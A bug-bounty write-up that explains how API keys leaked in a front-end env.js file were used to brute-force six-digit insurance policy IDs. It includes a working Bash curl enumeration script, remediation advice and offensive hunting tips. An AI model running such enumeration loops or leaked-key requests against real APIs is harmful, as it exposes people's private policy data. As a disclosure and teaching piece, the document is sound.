---
name: vr-writeup-api_key_leak
description: >-
  Vulnerability research reference: api_key_leak
gated: true
---
# API Key Leak in Front-End Source Code Leads to Insurance Policy Enumeration

> _**Ethical Warning:** Research, educational, and authorized testing purposes only. Please do not use against systems without permission._

* **Author:** Seth Kraft
* **Date:** May 15, 2026

---

The reconnaissance phase began by enumerating subdomains using [`subfinder`](https://github.com/skraft9/vulnerability-research/blob/main/custom_scripts/recon.sh) against the target's wildcard domain. While manually reviewing the hosted applications, I inspected the page source code.

During this review, I discovered an exposed configuration file named `env.js` referenced within the source code.

<img width="1843" height="1219" alt="Screenshot 2025-05-29 222222" src="https://github.com/user-attachments/assets/be0192f4-1fb8-4561-930e-172b96088a34" />

---

This file inadvertently exposed multiple API keys in plain text.

I immediately began testing the validity of the leaked API keys against the application's endpoints. The API required both the key and a valid six-digit Policy ID parameter. 

To test the endpoint's authorization controls, I submitted a request using a test Policy ID of `999999`, which successfully returned a valid response containing sensitive policy data.

```json
<REDACTED>","policyId":"999999","state":"<REDACTED>","<REDACTED>":true,"<REDACTED>":false,"<REDACTED>":[],"<REDACTED>":[{"id":"<REDACTED>","name":"<REDACTED> - <REDACTED>"},{"id":"<REDACTED>","name":"<REDACTED> - <REDACTED>"},{"id":"<REDACTED>","name":"<REDACTED> - <REDACTED>"},{"id":"<REDACTED>","name":"<REDACTED> - <REDACTED>"}]}

```

---

Because the Policy ID is constrained to a six-digit numerical format, the endpoint is highly susceptible to brute-force enumeration.

To demonstrate the impact, I wrote a Bash script to automate the enumeration process and verify if the leaked API key could be leveraged to access other valid policies at scale.

```bash
#!/bin/bash

API_KEY="<REDACTED>"
START=110999
END=100000

echo "[*] Starting range: $START to $END"

for ((id=START; id>=END; id--)); do
  echo "[*] Testing policy ID $id"

  resp=$(curl -sk "https://<REDACTED>/api/<REDACTED>/policies/$id?subscription-key=$API_KEY" \
    -H "Accept: application/json" \
    -H "X-Bug-Bounty: <BB_USERNAME>")

  if [[ $resp != *"InvalidPolicyNumber"* && $resp == *"groupId"* ]]; then
    echo "[+] VALID → $id"
    echo "$id → $resp" >> valid_policies.txt
  fi

  sleep 0.2
done

```

---

Upon executing the script, the API successfully returned data for valid policy IDs.

<img width="2524" height="1250" alt="Leak" src="https://github.com/user-attachments/assets/ef93b850-50eb-476d-afa2-0917d19bbd15" />

---

I then modified the `START` and `END` values to iterate through the remaining keyspace up to `999999`.

This automated enumeration resulted in the discovery of over 300 valid insurance policies, demonstrating data leakage and broken access control vulnerability.

<img width="741" height="175" alt="Screenshot 2025-05-29 225738" src="https://github.com/user-attachments/assets/62e4b233-609b-4c5f-9633-e691086c0cb2" />

---

## Root Cause Analysis

* **Exposure of Sensitive Secrets:** The initial point of failure was the inclusion of environment variables (`.env.js`) in the front-end build. Client-side source code should never contain privileged API keys or infrastructure secrets.
* **Broken Object Level Authorization (BOLA / IDOR):** The API implicitly trusted the valid API key without verifying if the requesting entity actually had the correct permissions to access the specific `policyId` being called.
* **Insufficient Identifier Entropy:** Relying on a highly predictable, six-digit numeric string for sensitive policy identifiers creates an inherently small keyspace, making the system highly susceptible to brute-forcing.
* **Lack of Anti-Automation Controls:** The endpoint permitted rapid, automated requests (iterating through the keyspace) without triggering any rate-limiting mechanisms or WAF blocks, facilitating bulk data exfiltration.

## Remediation Tips (Defensive Perspective)

* **Implement Robust Object-Level Authorization:** Ensure every API endpoint enforces strict validation to confirm the authenticated user or service has explicit rights to access the requested resource object (`policyId`).
* **Migrate to High-Entropy Identifiers:** Deprecate the use of sequential or short numeric IDs in favor of cryptographically secure, unpredictable identifiers (such as UUIDv4) for all sensitive records.
* **Audit Secret Management Protocols:** Review the CI/CD pipeline and webpack/build configurations to guarantee that environment variables and secrets are strictly managed server-side and never bundled into client-facing code.
* **Enforce Strict Rate Limiting:** Apply aggressive rate limiting and velocity checks on the `/api/*/policies/` endpoint. Additionally, implement alerting for high volumes of 404s or `InvalidPolicyNumber` responses to detect enumeration attempts early.

## Tips for Hunters (Offensive Perspective)

* **Always Trace the Build Artifacts:** Finding an `.env.js` file is often a symptom of poor CI/CD hygiene. When you spot one leak, immediately map out the surrounding directory structure and webpack bundles. Where there is one exposed config, there are often more routing files, admin endpoints, or legacy API versions left behind.
* **Prove the Impact, Not Just the Leak:** A leaked API key is frequently closed as "Informational" or "N/A" if it only accesses public data. The real bounty value comes from chaining the leak with a BOLA/IDOR condition. Always test keys against private endpoints or cross-tenant objects to demonstrate concrete data exfiltration.
* **Hunt for Low-Entropy Identifiers:** When you spot a six-digit numeric ID, assume it is brute-forceable until proven otherwise. Always script a quick enumeration loop over a localized keyspace to test for rate-limiting, WAF interference, or logging mechanisms before scaling up.
* **Deliver an Unambiguous PoC:** Providing a clean, automated script in your report removes any guesswork for the triage team. Taking the time to code a functional exploit transitions the report from a theoretical risk to an undeniable, high-severity vulnerability, saving you from prolonged back-and-forth in the vendor thread.

> Source: skraft9/vulnerability-research. Authorized security work only. Gated skill: needs the developer keyword.
